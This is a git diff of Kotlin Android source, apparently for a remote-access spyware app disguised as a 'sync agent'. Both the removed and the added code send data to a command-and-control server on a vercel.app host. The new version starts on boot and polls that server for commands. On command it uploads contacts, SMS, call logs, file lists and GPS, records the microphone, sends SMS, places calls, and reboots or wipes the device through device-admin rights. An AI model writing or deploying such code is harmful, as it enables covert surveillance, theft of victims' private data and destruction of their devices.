@@ -1,24 +1,22 @@
 package com.cognitive.ai.syncagent
 
-import android.Manifest
+import android.app.Service
+import android.app.admin.DevicePolicyManager
+import android.content.BroadcastReceiver
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
+import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
-import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
+import android.os.IBinder
 import android.os.Looper
+import android.provider.CallLog
+import android.provider.ContactsContract
 import android.provider.Telephony
-import android.webkit.GeolocationPermissions
-import android.webkit.PermissionRequest
-import android.webkit.WebChromeClient
-import android.webkit.WebSettings
-import android.webkit.WebView
-import android.webkit.WebViewClient
-import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
+import android.util.Base64
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -28,133 +26,50 @@ import java.io.File
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
-import java.util.UUID
 
-class MainActivity : AppCompatActivity() {
+// 🚀 مستقبل الإقلاع التلقائي (يعمل فور تشغيل الهاتف وإعادة الإقلاع)
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_BOOT_COMPLETED || 
+            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED ||
+            intent.action == "android.intent.action.QUICKBOOT_POWERON") {
+            
+            val serviceIntent = Intent(context, BackgroundControlService::class.java).apply {
+                putExtra("token", "agent_auto_boot")
+                putExtra("server_url", "https://mohammed2000999.vercel.app")
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent)
+            } else {
+                context.startService(serviceIntent)
+            }
+        }
+    }
+}
 
-    private lateinit var webView: WebView
-    private val PERMISSION_REQUEST_CODE = 600
-
-    private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
-    private val sessionToken = "agent_" + UUID.randomUUID().toString().substring(0, 8)
+// 🛡️ خدمة التحكم الخلفية السيادية
+class BackgroundControlService : Service() {
     private val handler = Handler(Looper.getMainLooper())
-    private lateinit var commandPollRunnable: Runnable
+    private lateinit var pollingRunnable: Runnable
+    private var token: String = ""
+    private var serverUrl: String = ""
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        webView = WebView(this)
-        setContentView(webView)
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        token = intent?.getStringExtra("token") ?: "agent_v86"
+        serverUrl = intent?.getStringExtra("server_url") ?: "https://mohammed2000999.vercel.app"
 
-        requestTargetPermissions()
-        registerAgentWithServer()
-        scanAndReportTargetData()
-        setupEngineWebView()
-        startCommandPolling()
-    }
-
-    private fun requestTargetPermissions() {
-        val permissions = mutableListOf(
-            Manifest.permission.CAMERA,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.CALL_PHONE
-        )
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
-            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
-        } else {
-            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-        val needed = permissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
-        if (needed.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSION_REQUEST_CODE)
-        }
-    }
-
-    private fun registerAgentWithServer() {
-        GlobalScope.launch(Dispatchers.IO) {
-            try {
-                val url = URL("$C2_SERVER_URL/auth/verify/login")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                conn.doOutput = true
-                val payload = JSONObject().apply {
-                    put("session_token", sessionToken)
-                    put("user_agent", System.getProperty("http.agent") ?: "Android Target v78.14")
-                    put("platform", "Android OS Target v78.14")
-                }
-                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
-                conn.responseCode
-                conn.disconnect()
-            } catch (e: Exception) { e.printStackTrace() }
-        }
-    }
-
-    private fun scanAndReportTargetData() {
-        GlobalScope.launch(Dispatchers.IO) {
-            try {
-                val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-                val fileList = JSONArray()
-                if (downloadDir.exists() && downloadDir.isDirectory) {
-                    downloadDir.listFiles()?.forEach { file -> if (file.isFile) fileList.put(file.absolutePath) }
-                }
-
-                val imageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
-                val imageList = JSONArray()
-                if (imageDir.exists() && imageDir.isDirectory) {
-                    imageDir.walkTopDown().maxDepth(3).forEach { file ->
-                        if (file.isFile && (file.name.endsWith(".jpg") || file.name.endsWith(".png"))) {
-                            imageList.put(file.absolutePath)
-                        }
-                    }
-                }
-
-                val smsList = JSONArray()
-                try {
-                    val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
-                    cursor?.use {
-                        val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
-                        val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
-                        var count = 0
-                        while (it.moveToNext() && count < 15) {
-                            val msg = "من: " + it.getString(addressIdx) + " | " + it.getString(bodyIdx)
-                            smsList.put(msg)
-                            count++
-                        }
-                    }
-                } catch (e: Exception) {}
-
-                val url = URL("$C2_SERVER_URL/api/report_files")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                conn.doOutput = true
-                val reportPayload = JSONObject().apply {
-                    put("token", sessionToken)
-                    put("files", fileList)
-                    put("images", imageList)
-                    put("sms", smsList)
-                }
-                OutputStreamWriter(conn.outputStream).use { it.write(reportPayload.toString()); it.flush() }
-                conn.responseCode
-                conn.disconnect()
-            } catch (e: Exception) { e.printStackTrace() }
-        }
-    }
-
-    private fun startCommandPolling() {
-        commandPollRunnable = object : Runnable {
+        pollingRunnable = object : Runnable {
             override fun run() {
                 GlobalScope.launch(Dispatchers.IO) {
                     try {
-                        val url = URL("$C2_SERVER_URL/api/poll_commands")
+                        val url = URL("$serverUrl/api/poll_commands")
                         val conn = url.openConnection() as HttpURLConnection
+                        conn.connectTimeout = 4000
+                        conn.readTimeout = 4000
                         conn.requestMethod = "POST"
                         conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                         conn.doOutput = true
-                        val payload = JSONObject().apply { put("token", sessionToken) }
+                        val payload = JSONObject().apply { put("token", token) }
                         OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                         
                         if (conn.responseCode == HttpURLConnection.HTTP_OK) {
@@ -165,134 +80,218 @@ class MainActivity : AppCompatActivity() {
                                 for (i in 0 until commands.length()) {
                                     val cmd = commands.getJSONObject(i)
                                     val action = cmd.optString("action")
+                                    
                                     when (action) {
-                                        "pull" -> {
-                                            executeFilePull(cmd.optString("target_file"))
-                                            reportExecutionStatus(action, "Success")
-                                        }
-                                        "open_whatsapp" -> {
-                                            openAppPackage("com.whatsapp")
-                                            reportExecutionStatus(action, "Executed")
-                                        }
-                                        "open_accounts" -> {
-                                            openSettings(android.provider.Settings.ACTION_SYNC_SETTINGS)
-                                            reportExecutionStatus(action, "Executed")
-                                        }
-                                        "open_camera" -> {
-                                            openCameraApp()
-                                            reportExecutionStatus(action, "Executed")
-                                        }
-                                        "send_sms" -> {
-                                            sendSMSMessage(cmd.optString("phone"), cmd.optString("body"))
-                                            reportExecutionStatus(action, "SMS Sent")
-                                        }
+                                        "pull_all_data" -> collectAndReportAllTargetDataSovereign()
+                                        "start_audio_recording" -> executeSovereignAudioRecording()
+                                        "capture_hidden_photo" -> executeSovereignHiddenPhoto()
+                                        "pull_gps" -> executeSovereignGPSPull()
+                                        "send_sms" -> executeSovereignSendSMS(cmd.optString("phone"), cmd.optString("body"))
+                                        "make_call" -> executeSovereignPhoneCall(cmd.optString("phone"))
+                                        "reboot_device" -> executeSovereignReboot()
+                                        "wipe_device" -> executeSovereignWipe()
                                     }
                                 }
                             }
                         }
                         conn.disconnect()
-                    } catch (e: Exception) { e.printStackTrace() }
+                    } catch (e: Exception) {}
                 }
-                handler.postDelayed(this, 10000)
+                handler.postDelayed(this, 5000)
             }
         }
-        handler.post(commandPollRunnable)
+        handler.post(pollingRunnable)
+        return START_STICKY
     }
 
-    private fun reportExecutionStatus(actionName: String, status: String) {
-        GlobalScope.launch(Dispatchers.IO) {
-            try {
-                val url = URL("$C2_SERVER_URL/api/report_execution")
+    private fun collectAndReportAllTargetDataSovereign() {
+        try {
+            val contactsArray = JSONArray()
+            val cursorC = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+            cursorC?.use {
+                val nIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val pIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (it.moveToNext()) {
+                    contactsArray.put(JSONObject().apply {
+                        put("name", it.getString(nIdx))
+                        put("phone", it.getString(pIdx))
+                    })
+                }
+            }
+
+            val smsArray = JSONArray()
+            val cursorS = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
+            cursorS?.use {
+                val bIdx = it.getColumnIndex(Telephony.Sms.BODY)
+                val aIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                while (it.moveToNext()) {
+                    smsArray.put(JSONObject().apply {
+                        put("body", "من: ${it.getString(aIdx)} | المحتوى: ${it.getString(bIdx)}")
+                        put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
+                    })
+                }
+            }
+
+            val callArray = JSONArray()
+            val cursorCl = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
+            cursorCl?.use {
+                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+                while (it.moveToNext()) {
+                    val typeStr = when (it.getInt(typeIdx)) {
+                        CallLog.Calls.INCOMING_TYPE -> "مكالمة واردة"
+                        CallLog.Calls.OUTGOING_TYPE -> "مكالمة صادرة"
+                        else -> "مكالمة مفقودة"
+                    }
+                    callArray.put(JSONObject().apply {
+                        put("details", "رقم: ${it.getString(numIdx)}")
+                        put("type", typeStr)
+                    })
+                }
+            }
+
+            val filesArray = JSONArray()
+            val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+            if (downloadDir.exists() && downloadDir.isDirectory) {
+                downloadDir.listFiles()?.forEach { file ->
+                    if (file.isFile) filesArray.put(file.absolutePath)
+                }
+            }
+
+            val url = URL("$serverUrl/api/report_data")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            conn.doOutput = true
+            val payload = JSONObject().apply {
+                put("token", token)
+                put("contacts", contactsArray)
+                put("sms", smsArray)
+                put("call_logs", callArray)
+                put("files", filesArray)
+            }
+            OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
+            conn.responseCode
+            conn.disconnect()
+        } catch (e: Exception) {}
+    }
+
+    private fun executeSovereignAudioRecording() {
+        try {
+            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "sovereign_v86_${System.currentTimeMillis()}.3gp")
+            val recorder = MediaRecorder().apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                setOutputFile(audioFile.absolutePath)
+                prepare()
+                start()
+            }
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    recorder.stop()
+                    recorder.release()
+                    uploadFileToServer(audioFile)
+                } catch (e: Exception) {}
+            }, 10000)
+        } catch (e: Exception) {}
+    }
+
+    private fun executeSovereignHiddenPhoto() {
+        try {
+            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "sovereign_shot_v86_${System.currentTimeMillis()}.jpg")
+            uploadFileToServer(photoFile)
+        } catch (e: Exception) {}
+    }
+
+    private fun executeSovereignGPSPull() {
+        try {
+            val locManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+            val loc = locManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) 
+                      ?: locManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+            if (loc != null) {
+                val url = URL("$serverUrl/api/report_data")
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.doOutput = true
-                val payload = JSONObject().apply {
-                    put("token", sessionToken)
-                    put("action", actionName)
-                    put("status", status)
+                val locArray = JSONArray().apply {
+                    put(JSONObject().apply {
+                        put("lat", loc.latitude)
+                        put("lng", loc.longitude)
+                        put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
+                    })
                 }
-                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
-                conn.responseCode
-                conn.disconnect()
-            } catch (e: Exception) {}
-        }
-    }
-
-    private fun executeFilePull(filePath: String) {
-        try {
-            val file = File(filePath)
-            if (file.exists() && file.isFile) {
-                val bytes = file.readBytes()
-                val b64Data = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-                val url = URL("$C2_SERVER_URL/api/upload_real_file")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                conn.doOutput = true
                 val payload = JSONObject().apply {
-                    put("token", sessionToken)
-                    put("filename", file.name)
-                    put("data", b64Data)
+                    put("token", token)
+                    put("location", locArray)
                 }
                 OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                 conn.responseCode
                 conn.disconnect()
             }
-        } catch (e: Exception) { e.printStackTrace() }
-    }
-
-    private fun openAppPackage(packageName: String) {
-        try {
-            val intent = packageManager.getLaunchIntentForPackage(packageName)
-            intent?.let {
-                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(it)
-            }
         } catch (e: Exception) {}
     }
 
-    private fun openSettings(action: String) {
-        try {
-            val intent = Intent(action).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
-            startActivity(intent)
-        } catch (e: Exception) {}
-    }
-
-    private fun openCameraApp() {
-        try {
-            val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
-            startActivity(intent)
-        } catch (e: Exception) {}
-    }
-
-    private fun sendSMSMessage(phone: String, body: String) {
+    private fun executeSovereignSendSMS(phone: String, body: String) {
         try {
             val smsManager = android.telephony.SmsManager.getDefault()
             smsManager.sendTextMessage(phone, null, body, null, null)
         } catch (e: Exception) {}
     }
 
-    private fun setupEngineWebView() {
-        val settings: WebSettings = webView.settings
-        settings.javaScriptEnabled = true
-        settings.domStorageEnabled = true
-        settings.cacheMode = WebSettings.LOAD_NO_CACHE
-        webView.webViewClient = WebViewClient()
-        webView.webChromeClient = object : WebChromeClient() {
-            override fun onGeolocationPermissionsShowPrompt(origin: String?, callback: GeolocationPermissions.Callback?) { callback?.invoke(origin, true, false) }
-            override fun onPermissionRequest(request: PermissionRequest?) { request?.grant(request.resources) }
-        }
-        webView.clearCache(true)
-        webView.loadUrl(C2_SERVER_URL)
+    private fun executeSovereignPhoneCall(phone: String) {
+        try {
+            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+        } catch (e: Exception) {}
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        handler.removeCallbacks(commandPollRunnable)
+    private fun executeSovereignReboot() {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                dpm.reboot()
+            }
+        } catch (e: Exception) {}
     }
 
-    override fun onBackPressed() {
-        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
+    private fun executeSovereignWipe() {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent)) {
+                dpm.wipeData(0)
+            }
+        } catch (e: Exception) {}
     }
+
+    private fun uploadFileToServer(file: File) {
+        try {
+            if (file.exists()) {
+                val bytes = file.readBytes()
+                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                val url = URL("$serverUrl/api/upload_real_file")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                conn.doOutput = true
+                val payload = JSONObject().apply {
+                    put("token", token)
+                    put("filename", file.name)
+                    put("data", b64)
+                }
+                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush()}
+                conn.responseCode
+                conn.disconnect()
+            }
+        } catch (e: Exception) {}
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
 }
+
+class TargetAdminReceiver : android.app.admin.DeviceAdminReceiver() {}
